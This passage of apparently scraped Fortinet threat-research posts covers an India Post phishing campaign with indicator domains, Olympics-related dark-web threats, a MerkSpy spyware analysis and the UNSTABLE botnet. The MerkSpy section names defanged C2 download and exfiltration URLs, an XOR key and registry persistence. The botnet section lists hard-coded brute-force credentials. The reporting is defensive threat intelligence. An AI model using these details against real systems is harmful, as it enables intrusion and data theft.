relevant insights. Between January and July 2024, we found over 470 domain registrations mimicking India Post's official domain. Among these, 296 domains were registered via the Chinese registrarBeijing Lanhai Jiye Technology Co., Ltd.,followed by 152 registrations through Namesilo, an American domain registrar. The notable concentration of registrations through a Chinese registrar certainly raises substantial concerns about the underlying intentions. This activity exemplifies ahomograph phishing attack, where domain names are created to look visually similar to legitimate ones. The most frequently used top-level domains (TLDs) include 'vip' (200 registrations), 'top' (81 registrations), and 'buzz' (40 registrations). The registration cost per domain varies: 'vip' TLDs typically range from USD 4 to USD 5 per domain, whereas 'top' TLDs cost between USD 1 and USD 2 per domain. To calculate the total investment: Our analysis revealed that Tencent, a Chinese hosting service provider, hosts a significant number of these domains (232). Additionally, Tencent hosts 16 domains registered in Santa Clara. Further analysis revealed that 262 domain names point to the IP address 119.28.68[.]187, also hosted onTencent's servers. When investigating the phishing domain 'indiapost[.]top,' which impersonates India Post through a cloned copy of the original website, it was discovered that the domain does not host any content. Instead, specific paths on the domain are utilized to host the phishing website that impersonates India Post. While the domain name was registered on 28th November 2023, it is now actively being used in their operations. It is now likely to evade detection by antivirus engines as domains typically gain reputation over time. The phishing site (on the left) is an identical copy of the original India Post website (on the right). Continuing as a regular user, the fraudsters collect sensitive information such as name, full residential address, email ID, and phone number. This information can be leveraged in future operations for further scams, sending phishing emails, spreading disinformation/misinformation, or distributing malware. On the next page, the fraudulent site requests debit/credit card information for a payment of INR 25.02, claiming it is a charge for redelivering the package. The threat actors begin by sending a message via iMessage directly to the recipients' registered Apple ID email addresses. The sender ID could be a newly registered Apple ID or a compromised account. This method ensures that the message appears within the recipient's Messages app as an iMessage, distinct from traditional email communications, provided both parties use iMessage-enabled devices and have their Apple IDs configured for iMessage. The investment in registering these domain names alone exceeds USD 1500, not to mention additional costs for hosting and development. This significant investment highlights the threat actors' commitment, the phishing operation's scale, and its potential long-term impact. As a result, we feel that the likelihood of numerous victims falling prey to these scams is increased, leading to substantial financial losses, data breaches, and other security issues for individuals and organizations targeted by these domains. This operation may also serve as a strategic initiative to raise funds to fuel operations in China. Because of this, awareness and proactive measures are crucial to mitigating the risks posed by these phishing activities. The suspicious domains used in the campaign described in this report are detected and blocked by FortiGuard URL Filtering Service, utilized by FortiGate, FortiClient, and FortiMail, as: WebFilter:Phishing WebFilter:Spam URLs FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. In addition to these protections, we suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. italenbabusik@hotmail[.]comjessica467@qlq-online[.]demarrotte436915@gmail[.]comorozcoharryavw@hotmail[.]comchermonahscales2980545@gmail[.]com indiapost[.]xyz indiapost[.]online indiapost[.]live indiapost[.]biz indiapost[.]club indiapost[.]pics indiapost[.]homes indiapost[.]click indiapost[.]vip indiapost[.]buzz indiapost[.]sbs indiapost[.]skin indiapost[.]world indiapost[.]cfd indiapost[.]cyou indiapost[.]rest indiapost[.]site indiapost[.]mom indiapost[.]lat indiapost[.]lol indiapost[.]digital indiapostal[.]com indiapostdaily[.]com indiapostin[.]com indiaposte[.]com indiapostgdsonline[.]in indiapostcode[.]online indiapostalgds[.]com indiapostofficejob[.]org indiapostal[.]xyz indiapostrecruitment2021[.]xyz indiapostpayment[.]in indiapostfast[.]com indiapost-in[.]xyz indiapostin[.]top indiapostusa[.]xyz indiapostn[.]top indiapostgovv[.]top indiapostt[.]top indiapostgov[.]info indiapostgdsonline[.]ink indiaposte[.]top indiaposthuman[.]com indiaposti[.]icu indiapostgov[.]org indiapostalcode[.]org indiapostpogo[.]top indiapostgk[.]sbs indiapostij[.]top indiapostscv[.]top indiaposthy[.]top indiapostpv[.]top indiapostjx[.]top indiapostco[.]top indiapostcw[.]top indiapostkp[.]sbs indiapostkp[.]buzz indiapostbov[.]top indiapostnov[.]buzz indiapostgk[.]buzz indiapostscv[.]buzz indiapostsfv[.]buzz indiapostscv[.]sbs indiapostsfv[.]top indiapostfb[.]top indiapostwb[.]top indiapostxh[.]top indiapostyt[.]top indiapostgk[.]lol indiapostgv[.]lol indiapostbov[.]sbs indiapostnov[.]sbs indiapostkp[.]top indiapostlf[.]top indiapostbs[.]top indiapostbw[.]top indiapostcu[.]top indiapostem[.]top indiapostgl[.]top indiaposthk[.]top indiapostjd[.]top indiapostkg[.]top indiapostmc[.]top indiapostmr[.]top indiapostnj[.]top indiapostnn[.]top indiapostsc[.]top indiapostsy[.]top indiapostwy[.]top indiapostxf[.]top indiapostsx[.]buzz indiapostdgx[.]buzz indiapostsdu[.]buzz indiapostdes[.]buzz indiapostsx[.]icu indiapostdu[.]icu indiapostsdu[.]top indiapostcg[.]buzz indiapostgc[.]buzz indiapostnews[.]buzz indiaposttc[.]buzz indiapostdgx[.]lat indiapostvg[.]buzz indiapostcg[.]life indiapostvg[.]sbs indiapostbs[.]sbs indiapostvg[.]xyz indiapostjsx[.]xyz indiapostdm[.]buzz indiapostbm[.]buzz indiapostjsx[.]buzz indiapostdgx[.]cfd indiapostsx[.]cfd indiapostgx[.]cfd indiapostdgx[.]sbs indiapostdm[.]sbs indiapostjsx[.]sbs indiapostsx[.]sbs indiapostbm[.]top indiapostsx[.]xyz indiapostbm[.]xyz indiapostdgx[.]xyz indiapostdm[.]xyz indiapostlv[.]top indiapostmk[.]top indiapostil[.]top indiapostdgx[.]top indiapostkr[.]top indiapostlt[.]top indiapostgx[.]lat indiapostigu[.]xyz indiapostgx[.]world indiapostok[.]top indiapostrc[.]top indiapostah[.]top indiapostfw[.]top indiapostwl[.]top indiapostwm[.]top indiapostci[.]top indiapostdq[.]top indiapostjp[.]top indiapostmj[.]top indiapostnx[.]top indiapostos[.]top indiapostpy[.]top indiapostqr[.]top indiapostrq[.]top indiapostub[.]top indiapostwg[.]top indiapostyb[.]top indiapostyw[.]top indiapostzc[.]top indiapostzp[.]top indiapostsz[.]buzz indiapostzj[.]buzz indiapostgz[.]cfd indiaposteg[.]sbs indiapostsz[.]top indiaposteg[.]xyz indiapostges[.]xyz indiapostsz[.]xyz indiapostrg[.]xyz indiapostsge[.]xyz indiapostzj[.]xyz indiapostbg[.]vip indiapostrg[.]vip indiapostfd[.]vip indiaposthk[.]vip indiapostiw[.]vip indiapostfv[.]vip indiapostnz[.]vip indiapostfw[.]vip indiapostfj[.]vip indiapostux[.]vip indiapostox[.]vip indiapostdx[.]vip indiapostwe[.]vip indiapostwp[.]vip indiapostdt[.]vip indiapostpm[.]vip indiapostkx[.]vip indiapostpo[.]vip indiapostmr[.]vip indiapostym[.]vip indiapostmu[.]vip indiapostbl[.]vip indiapostjl[.]vip indiapostei[.]vip indiapostul[.]vip indiapostax[.]vip indiapostny[.]vip indiapostxt[.]vip indiapostik[.]vip indiapostir[.]vip indiapostns[.]vip indiapostqb[.]vip indiapost-update[.]com indiapostqq[.]vip indiapostdo[.]vip indiapostes[.]vip indiapostcp[.]vip indiapostfs[.]vip indiapost-updatemypost[.]com indiapost-trackmypost[.]com indiapostub[.]vip indiapostag[.]vip indiapostam[.]vip indiapostej[.]vip indiapostgt[.]vip indiapostgw[.]vip indiaposthn[.]vip indiapostlg[.]vip indiapostvb[.]vip indiapostxz[.]vip indiapostjo[.]vip indiapostne[.]vip indiapostps[.]vip indiapostby[.]vip indiapostoc[.]vip indiaposthd[.]vip indiapostxr[.]vip indiapostqw[.]vip indiapostmt[.]vip indiapostaz[.]vip indiapostvx[.]vip indiapostwq[.]vip indiapostuf[.]vip indiapostgi[.]vip indiapostjq[.]vip indiapostph[.]vip indiapostmz[.]vip indiapostdv[.]vip indiapostoi[.]vip indiapostrc[.]vip indiaposttg[.]vip indiapostbz[.]vip indiapostnt[.]vip indiapostek[.]vip indiapostld[.]vip indiaposttx[.]vip indiapostzv[.]vip indiapostjk[.]vip indiapostagov[.]icu indiapostusa[.]cfd indiapostwc[.]vip indiapostht[.]vip indiapostxf[.]vip indiapostib[.]vip indiapostgu[.]vip indiapostpq[.]vip indiaposteo[.]vip indiapostap[.]vip indiapostdf[.]vip indiapostjx[.]vip indiapostky[.]vip indiapostlj[.]vip indiapostmn[.]vip indiapostnr[.]vip indiapostqr[.]vip indiapostvg[.]vip indiapostzc[.]vip indiapost-trackpost[.]com indiapost-updatemyparcel[.]com indiapostusa[.]buzz indiapost-checkmypost[.]com indiapost-checkmymail[.]com indiaposte[.]buzz indiaposte[.]icu indiapostusa[.]icu indiapostlw[.]sbs indiapostgui[.]sbs indiapostigu[.]sbs indiapostgui[.]xyz indiapostdw[.]xyz indiaposte[.]xyz indiapostlw[.]xyz indiapostzd[.]vip indiaposteg[.]vip indiapostbv[.]vip indiapostur[.]vip indiapostiv[.]vip indiapostdd[.]vip indiapostqh[.]vip indiapostwg[.]vip indiapostsil[.]cyou indiapostru[.]vip indiapostbm[.]vip indiapostwh[.]vip indiapostmk[.]vip indiapostol[.]vip indiapostqs[.]vip indiapostlt[.]vip indiapostdw[.]top indiapostlw[.]top indiapostfr[.]vip indiapostbe[.]vip indiapostbs[.]vip indiapostcs[.]vip indiapostfn[.]vip indiapostfy[.]vip indiapostjd[.]vip indiapostjf[.]vip indiapostkm[.]vip indiapostkq[.]vip indiaposton[.]vip indiapostpj[.]vip indiapostpy[.]vip indiapostse[.]vip indiapostsq[.]vip indiapostss[.]vip indiapostvd[.]vip indiapostvy[.]vip indiapostxw[.]vip indiapostyr[.]vip indiapostsp[.]vip indiapostha[.]vip indiapostog[.]vip indiapostqf[.]vip indiapostut[.]vip indiapostwk[.]vip indiapostin[.]sbs indiapostin[.]xyz indiapostin[.]live indiapostsa[.]buzz indiaposta[.]buzz indiapostdw[.]buzz indiapostgv[.]buzz indiapostoffice[.]buzz indiaposts[.]buzz indiapostzh[.]buzz indiaposta[.]mom indiaposts[.]mom indiapostsa[.]mom indiapostzh[.]sbs indiaposta[.]xyz indiapostgv[.]xyz indiapostks[.]buzz indiapostgov[.]xyz indiapostgo[.]buzz indiapostgo[.]life indiapostgo[.]mom indiapostgds[.]org indiapostgo[.]xyz indiapostsge[.]cfd indiapostgv[.]cfd indiapostcp[.]buzz indiapostblog[.]buzz indiapostges[.]buzz indiapostsge[.]buzz indiapostsv[.]buzz indiapostoffice[.]hair indiapost-gov[.]life indiapostoffice[.]life indiapostgv[.]sbs indiaposty[.]xyz indiapostgy[.]vip indiapost-vip-in[.]buzz indiapostggs[.]cfd indiapostbs[.]cfd indiapostcp[.]sbs indiapostggs[.]sbs indiapost-i[.]com indiapostyxw[.]buzz indiapostgov[.]top indiaposti[.]com indiapost-gov[.]com indiapost-tel[.]com indiapost-in[.]com indiapost-gov[.]icu indiapost-in[.]net indiapost-postain[.]top indiapostiu[.]vip indiapost-indi[.]top indiaposttel[.]com indiapost1[.]com indiapost-i[.]net indiaposty[.]sbs indiapost-i[.]top indiapostoffice[.]top indiapost-ind[.]top indiapostaq[.]vip indiapostew[.]vip indiapostgf[.]vip indiapostlk[.]vip indiapostaw[.]vip indiapostds[.]vip indiaposter[.]vip indiapostjh[.]vip indiapostmf[.]vip indiapostnm[.]vip indiapostoj[.]vip indiapostop[.]vip indiapostqv[.]vip indiapostrl[.]vip indiaposttn[.]vip indiapostty[.]vip indiapostui[.]vip indiapostxc[.]vip indiapostxp[.]vip indiapostkz[.]vip indiapostq[.]xyz indiapostw[.]xyz indiaposta-in[.]top indiapost-gov-a[.]buzz indiapost-gov-in[.]buzz indiaposte[.]sbs indiapost-posta[.]top indiapostoffices[.]top indiapostgm[.]vip indiapostmh[.]vip indiapostbx[.]vip indiapostcb[.]vip indiapostjt[.]vip indiapostks[.]vip indiapostnh[.]vip indiapostnw[.]vip indiapostpt[.]vip indiapostrf[.]vip indiaposttj[.]vip indiapostwv[.]vip indiapostyx[.]vip indiapostyz[.]vip indiapostgx[.]vip indiapostpd[.]vip indiapostsl[.]vip indiapostvu[.]vip indiapostzy[.]vip indiapostvt[.]vip indiapostim[.]vip indiapostxn[.]vip indiapostqi[.]vip indiapostbj[.]vip indiapostyt[.]vip indiapostdk[.]vip indiapostnews[.]top indiapost-al[.]com indiaposty[.]cfd indiapostid[.]vip indiapost-ia[.]top indiapostk[.]com indiapost-gov-i[.]com indiapost-l[.]com indiapost-p[.]com indiaposta[.]com indiaposth[.]com indiapostl[.]com indiapostt[.]com indiapostos[.]com indiapostall[.]com indiapost-l[.]net indiapostgroup[.]net indiapostos[.]net indiapostkl[.]vip indiapostoffice[.]one indiapostpi[.]vip indiapostqo[.]vip indiapostyl[.]vip indiapostto[.]vip indiapostwf[.]vip indiapostnc[.]vip indiapostvm[.]vip indiaposttb[.]vip indiapostal[.]top indiapostao[.]vip indiapostit[.]vip indiapostec[.]vip indiapostsf[.]vip indiapostzu[.]vip indiapostic[.]vip indiapostix[.]vip indiapostil[.]vip indiapost-telgov[.]com indiapostos-in[.]com indiapost-h[.]com indiand[.]xyz/track/ dsfdg[.]sbs/i/ indiapostsi[.]top/IN/ indiapostin[.]com/in/ indiapost-id[.]top/BRblTi/ indiapost-i[.]net/in/ indiaapost[.]cyou/track/ indiaptgov[.]top/in/ indaai[.]live/track/ indiapost-al[.]com/in/ mobile,phishing FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/phishing-campaign-targeting-mobile-users-in-india-using-india-post-lures"
  },
  {
    "title": "Dark Web Shows Cybercriminals Ready for Olympics. Are You?",
    "content": "FortiGuard Labs Threat Research Major sporting events like the World Cup, Super Bowl, and Wimbledon attract millions, even billions, of viewers. Argentina’s shootout win over France in the final game of the Qatar 2022 World Cup reached a global audience of 1.5 billion viewers. And the Olympics, starting later this month in Paris, is the biggest of them all—with the 2020 Tokyo Olympics having attracted a worldwide audience of over 3 billion viewers. These events are also prime opportunities for cybercriminals. Over the past decade, the number of cyberattacks targeting major events has surged, increasing from 212 million documented attacks at the London 2012 Games to a staggering 4.4 billion at the Tokyo 2020 Games. These attacks often have direct financial motives, such as scams, digital fraud, or the acquisition of valuable data from attendees, viewers, and sponsors. In their excitement, eager fans often overlook potential risks when purchasing tickets, arranging accommodations, or buying memorabilia, making them easy targets for cybercriminals. Others, desperate to view specific events, are enticed by malicious websites offering free access, only to have their devices compromised or personal data stolen. And with the world’s media focused on the event, criminals with a political agenda are looking for a large audience for their message by disrupting a significant site or knocking critical services offline. According to a new FortiGuard Labs analysis based on threat intelligence provided byFortiRecon, this year’s Olympics have been a target for a growing number of cybercriminals for over a year. Using publicly available information and proprietary analysis, this report provides a comprehensive view of planned attacks, such as third-party breaches, infostealers, phishing, and malware, including ransomware. To download the full FortiGuard Labs report, visithere. FortiGuard Labs has observed a significant increase in resources being gathered for the Paris Olympic Games, especially those targeting French-speaking users, French government agencies and businesses, and French infrastructure providers. Beginning the second half of 2023, we saw a surge in darknet activity targeting France. This 80% to 90% increase has remained consistent across 2H 2023 and 1H 2024. The prevalence and sophistication of these threats are a testament to cybercriminals’ planning and execution, with the dark web serving as a hub for their activities. Documented activities include the growing availability of advanced tools and services designed to accelerate data breaches and gather personally identifiable information (PII), the sale of stolen credentials and compromised VPN connections to enable unauthorized access to private networks, and advertisements for phishing kits and exploit tools customized for the Paris Olympics. It also includes the sale of French databases that contain sensitive personal information, such as full names, dates of birth, government identification numbers, email addresses, phone numbers, residential addresses, and other PII, as well as combo lists (a collection of compromised usernames and passwords used for automated brute-force attacks) composed of French citizens. Given that Russia and Belarus are not invited to this year’s games, we have also seen a spike in hacktivist activity by pro-Russian groups—like LulzSec, noname057(16), Cyber Army Russia Reborn, Cyber Dragon, and Dragonforce—that specifically call out that they’re targeting the Olympic games. Groups from other countries and regions are also prevalent, including Anonymous Sudan (Sudan), Gamesia Team (Indonesia), Turk Hack Team (Turkey), and Team Anon Force (India). Phishing kits:While phishing is perhaps the easiest form of attack, many low-sophistication cybercriminals don’t know how to create or distribute phishing emails. Phishing kits provide novice attackers with a simple user interface that helps them compose a convincing email, add a malicious payload, create a phishing domain, and procure a list of potential victims. The addition of text-generating AI services has also eliminated the spelling, grammatical, and graphical errors that allow recipients to detect an email as malicious. The FortiGuard Labs team has also documented a significant number of typosquatting domains registered around the Olympics, including variations on the name (oympics[.]com, olmpics[.]com, olimpics[.]com, and others). These are combined with cloned versions of the official ticket website that take you to a payment method where you don’t get a ticket, and your money is gone. In collaboration with Olympic partners, the French Gendarmerie Nationale hasidentified 338 fraudulent websitesclaiming to sell Olympic tickets. According to their data, 51 sites have been shut down, and 140 have received formal notices from law enforcement. Similarly, several Olympic Games–themed lottery scams have been identified, with many impersonating major brands such as Coca-Cola, Microsoft, Google, the Turkish National Lottery, and the World Bank. The primary targets for these lottery scams are users in the U.S., Japan, Germany, France, Australia, the U.K., and Slovakia. We have also seen an increase in coding services for creating phishing websites and associated live panels, bulk SMS services to enable mass communication, and phone number spoofing services. These offerings can facilitate phishing attacks, spread misinformation, and disrupt communications by impersonating trusted sources, potentially causing significant operational and security challenges during the event. Infostealers:Information stealer malware is designed to stealthily infiltrate a victim’s computer or device and harvest sensitive information, such as login credentials, credit card details, and other personal data. We have also observed that threat actors are deploying various types of stealer malware to infect user systems and obtain unauthorized access. Threat actors and initial access brokers can further leverage this information to execute ransomware attacks, causing substantial harm and financial loss to individuals and organizations. Our data indicates that Raccoon is currently the most active infostealer in France, accounting for 59% of all detections. Raccoon is an effective and inexpensive Malware-as-a-Service (MaaS) sold on dark web forums. It steals browser autofill passwords, history, cookies, credit cards, usernames, passwords, cryptocurrency wallets, and other sensitive data. It is followed by Lumma (another subscription-based MaaS) at 21% and Vidar at 9%. In addition to celebrating athleticism and sportsmanship, the Paris Olympics 2024 is a high-stakes cyberthreat target, drawing attention from cybercriminals, hacktivists, and state-sponsored actors. Cybercriminals are leveraging phishing scams and fraudulent schemes to exploit unsuspecting participants and spectators. Fake ticketing platforms, fraudulent merchandise, and identity theft tactics threaten financial loss and undermine public trust in event-related transactions. Further, due to France’s political stances and international influence, the Paris Olympics 2024 is also a prime target for politically motivated groups. We anticipate that hacktivist groups will focus on entities associated with the Paris Olympics to disrupt the event, targeting infrastructure, media channels, and affiliated organizations to disrupt event proceedings, undermine credibility, and amplify their messages on a global stage. To learn more about FortiRecon and generating reports like this for your organization,visit here. Organizations and individuals attending the Olympic Games need to be aware of heightened travel-related cyberthreats. These include the increased likelihood of public Wi-Fi interception and fraudulent activities linked to Olympics-related events, including malicious websites and phishing scams. We also anticipate increased targeted attacks against VIPs, including government officials, senior executives, and key decision-makers, and additional precautions should be taken. FortiGuard Labs strongly recommends installing endpoint protection or EDR on all devices, taking extra care when connecting to public wireless networks, and using SASE services to encrypt traffic. Major events like the Olympics are good reminders that we all need to remain vigilant against cyberthreats. FortiGuard Labs recommends the following best security practices to safeguard yourself and your organization against cyberattacks. Employee and user training and awareness:Conduct regular training sessions to highlight the risks of Olympics-related social engineering lures in the runup to and during the Games. Training should focus on recognizing deceptive emails and fake websites and emphasize the importance of promptly reporting suspicious activities. Public awareness campaigns:Launch comprehensive public awareness campaigns to educate attendees and participants about cybersecurity threats. Guide identifying phishing attempts, avoiding suspicious links, and reporting potential threats to designated authorities. Protect sensitive data:Use security orchestration, automation, and response tools to detect and respond promptly to unusual activities. Maintain encrypted backups of critical data stored securely offline to mitigate the impact of ransomware attacks. Monitor the external attack surface:Continuously monitor and assess your IT infrastructure’s external attack surface to identify vulnerabilities and potential risks. Implement measures to secure remote desktop protocol access and prevent exploitation of web server misconfigurations. Visit theFortinet DRPpage for information on how FortiRecon can help. Enforce multi-factor authentication and strong password policies:Implement multi-factor authentication across all systems and enforce a robust password policy. Monitor darknet channels for compromised credentials to proactively protect organizational portals. User endpoint protection:Deploy antivirus and antimalware software on all devices to detect and mitigate phishing attempts and malware infections. Regularly update software to safeguard against known and unknown vulnerabilities. Implement patch management:Maintain up-to-date software and operating systems by promptly applying security patches. Prioritize critical vulnerabilities that could lead to remote code execution or denial-of-service attacks. DDoS protection:Safeguard infrastructure with multi-layered DDoS prevention solutions, including firewalls, VPNs, and anti-spam filters. Monitor network traffic for anomalies that may indicate DDoS attacks and take preemptive actions. Prevent ransomware attacks:Implement proactive measures such as regular software updates, secure offline backups, and user education to prevent ransomware incidents. Utilize threat intelligence to monitor darknet activities for potential threats and data leaks. Website defacement prevention:Deploy web application firewalls to filter and block malicious traffic, protecting against website defacement and unauthorized access attempts. Participate in threat hunting and response:Conduct robust threat-hunting activities based on compromised account information. Isolate infected systems promptly and perform system reimaging as necessary to mitigate threats. Leverage cyberthreat intelligence (CTI):Utilize CTI to gather real-time data on emerging cyberthreats and potential risks. Monitor darknet chatter for early indicators of cyberattacks and data leaks to enable proactive incident response. Download your copy of theThreat Actors Targeting 2024 Summer Olympics threat intelligence report. olympics,FortiRecon FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/dark-web-shows-cybercriminals-ready-for-olympics"
  },
  {
    "title": "MerkSpy: Exploiting CVE-2021-40444 to Infiltrate Systems",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High Spyware is malicious software engineered to covertly monitor and gather information from a user’s computer without their awareness or consent. It can record activities like keystrokes, browsing behavior, and personal information, often transmitting this data to a third party for espionage or theft. FortiGuard Labs recently detected an attack exploiting the CVE-2021-40444 vulnerability in Microsoft Office. This flaw allows attackers to execute malicious code via specially crafted documents. In this instance, the exploitation led to the deployment of a spyware payload known as “MerkSpy.” MerkSpy is designed to clandestinely monitor user activities, capture sensitive information, and establish persistence on compromised systems. This blog will dissect the stages of this complex attack, offering insights into the techniques used by cybercriminals to infiltrate systems and steal sensitive data. The initial vector for this attack is a deceptive Microsoft Word document posing as a job description for a software developer position. Opening the document triggers the exploitation of CVE-2021-40444, a remote code execution vulnerability within the MSHTML component used by Internet Explorer in Microsoft Office. This vulnerability permits an attacker to execute arbitrary code on a victim’s machine without additional user interaction beyond opening the document. The attacker conceals the URL within the “\\_rels\\document.xml” file. It directs to hxxp://45[.]89[.]53[.]46/google/olerender[.]html, downloading an HTML file that sets the stage for the next phase of the attack. After the successful exploitation, the malicious document initiates the downloaded payload, “olerender.html,” from a remote server. This HTML file is strategically crafted, with innocuous script filling the beginning to mask its true intent. The end of the file conceals the shellcode and injection process, which propels the attack forward when executed on the victim’s machine. “olerender.html” first checks the system’s OS version. If it detects an X64 architecture, it extracts the embedded “sc_x64” shellcode. After determining the OS version and extracting the appropriate shellcode, “olerender.html” locates and retrieves the Windows APIs “VirtualProtect” and “CreateThread.” These functions are crucial for the following steps: it leverages “VirtualProtect” to modify memory permissions, allowing the decoded shellcode to be written into memory securely. Following this, “CreateThread” executes the injected shellcode, setting the stage for downloading and executing the next payload from the attacker’s server. This process ensures that the malicious code runs seamlessly, facilitating further exploitation. Once the shellcode is in place, it functions as a downloader, initiating the next phase of the attack. It reaches out to the same remote server to fetch a file, deceptively named “GoogleUpdate.” Despite its seemingly innocuous name, “GoogleUpdate” is far from benign. This file harbors the core malicious payload, which is deeply encoded to evade detection by standard security measures. Upon successful download, the shellcode meticulously decodes and prepares this payload for execution. Once “GoogleUpdate” is downloaded, the shellcode decodes the file using an XOR key of 0x25021420 and an increment value of 0x00890518. This decryption process is crucial as it extracts the concealed actual payload embedded within the file. By employing these specific cryptographic techniques, the shellcode ensures that the malicious content remains hidden, allowing the attacker to execute their intended operations on the compromised system effectively. The extracted payload is protected with VMProtect. Its primary function is seamlessly injecting the MerkSpy spyware into crucial system processes. MerkSpy spyware operates covertly within a system, enabling it to capture sensitive information, monitor user activities, and exfiltrate data to remote servers controlled by malicious actors. MerkSpy achieves persistence by masquerading as “Google Update,” adding a registry entry for “GoogleUpdate.exe” in “Software\\Microsoft\\Windows\\CurrentVersion\\Run.” This deceptive tactic ensures that MerkSpy launches automatically at system startup, enabling continuous operation and data exfiltration without the user’s knowledge or consent. Following its installation, MerkSpy initiates the exfiltration process and begins monitoring specific targets: capturing screenshots, logging keystrokes, retrieving Chrome login credentials, and accessing the MetaMask extension. Once it gathers this data, MerkSpy uploads the collected information to the attacker’s server through the URL hxxp://45[.]89[.]53[.]46/google/update[.]php. The POST request employs a user agent string of “WINDOWS” and uses a fixed boundary, “---------------------------update request,” indicating it is a multi-part form-data submission. The request body is comprised of multiple parts: Based on telemetry from the C2 server at “45[.]89[.]53[.]46,” a significant activity spike began at the end of May, primarily targeting North America and India. The initial phase of the attack leverages a vulnerability in the MSHTML component used by Internet Explorer. Upon exploitation, it initiates the download of a file named “olerender.html,” which contains JavaScript and embedded shellcode. This shellcode decodes the downloaded content to execute an injector responsible for loading the MerkSpy spyware into memory and integrating it with active system processes. MerkSpy is capable of sophisticated surveillance activities, including keystroke logging, screenshot capture, and harvesting Chrome browser login data. By understanding the intricacies of this attack chain, organizations can enhance their readiness and deploy effective defenses against such intrusions. FortiGuard Labs remains vigilant in monitoring these threats and offers ongoing intelligence to safeguard our users. The malware described in this report is detected and blocked by FortiGuard Antivirus as: MSOffice/Agent.AN!tr HTML/Agent.SC!tr Data/Agent.C1FT!tr W64/Injector.SRQ!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (content disarm and reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s free NSE training module: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. 45[.]89[.]53[.]46 92eb60179d1cf265a9e2094c9a54e025597101b8a78e2a57c19e4681df465e08 95a3380f322f352cf7370c5af47f20b26238d96c3ad57b6bc972776cc294389a 0ffadb53f9624950dea0e07fcffcc31404299230735746ca43d4db05e4d708c6 dd369262074466ce937b52c0acd75abad112e395f353072ae11e3e888ac132a8 569f6cd88806d9db9e92a579dea7a9241352d900f53ff7fe241b0006ba3f0e22 6cdc2355cf07a240e78459dd4dd32e26210e22bf5e4a15ea08a984a5d9241067 microsoft office,spyware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/merkspy-exploiting-cve-2021-40444-to-infiltrate-systems"
  },
  {
    "title": "The Growing Threat of Malware Concealed Behind Cloud Services",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Linux DistributionsImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High Cybersecurity threats are increasingly leveraging cloud services to store, distribute, and establish command and control (C2) servers, such asVCRUMSstored on AWS orSYK Crypterdistributed via DriveHQ. This shift in strategy presents significant challenges for detection and prevention, as cloud services provide scalability, anonymity, and resilience that traditional hosting methods lack. Over the past month, FortiGuard Labs has been monitoring botnets that have adopted this strategy, abusing cloud services to enhance their malicious capabilities. These botnets, such as UNSTABLE and Condi, have been observed leveraging cloud storage and computing services operators to distribute malware payloads and updates to a broad range of devices. Using cloud servers for C2 operations ensures persistent communication with compromised devices, making it harder for defenders to disrupt an attack. We have also observed a threat actor exploiting multiple vulnerabilities to target JAWS webservers, Dasan GPON home routers, Huawei HG532 routers, TP-Link Archer AX21, and Ivanti Connect Secure to amplify their attacks. In this article, we will detail this threat actor's initial attack method and further explore the botnets being used. Initial access by the UNSTABLE Botnet targets the JAWS Webserver RCE vulnerability, CVE-2016-20016, and retrieves the downloader script “jaws” from 45[.]128[.]232[.]15. It includes multiple binary files for 13 architectures executed using the parameter “jaws.exploit.” The UNSTABLE Botnet is a Mirai variant that uses XOR to encode its configuration. It has three main modules: exploitation, scanner, and DDoS attack. The exploitation module targets three vulnerabilities: CVE-2016-20016, CVE-2018-10561/10562, and CVE-2017-17215. The scanner module includes a hard-coded list of usernames and passwords that it uses for brute-force scanning of other endpoints in the network. root Zte521 swsbzkgn taZz@23495859 grouter juantech tsgoingon telnet pass solokey oelinux123 password admin tl789 svgodie default GM8182 t0talc0ntr0l4! user hunt5759 zhongxing guest telecomadmin zlxx. telnetadmin twe8ehome zsun1188 1111 h3c xmhdipc 12345 nmgx_wapia klv123 123456 private hi3518 54321 abc123 7ujMko0vizxv 88888888 ROOT500 7ujMko0admin 20080826 ahetzip8 dreambox 666666 anko system 888888 ascend iwkb 1001chin blender realtek xc3511 cat1029 00000000 vizxv changeme 12341234 5up iDirect huigu309 jvbzd nflection win1dows hg2x0 ipcam_rt5350 antslq Figure 5: Scanner module and hard-coded username/password The DDoS attack module is a typical list that covers several protocols. The UNSTABLE botnet contains nine methods: attack_tcp_ack, attack_tcp_syn, attack_tcp_legit, attack_tcp_sack2, attack_udp_plain, attack_udp_vse, attack_udp_thread, attack_gre_ip, and attack_method_nudp. The botnets can choose the appropriate method based on commands 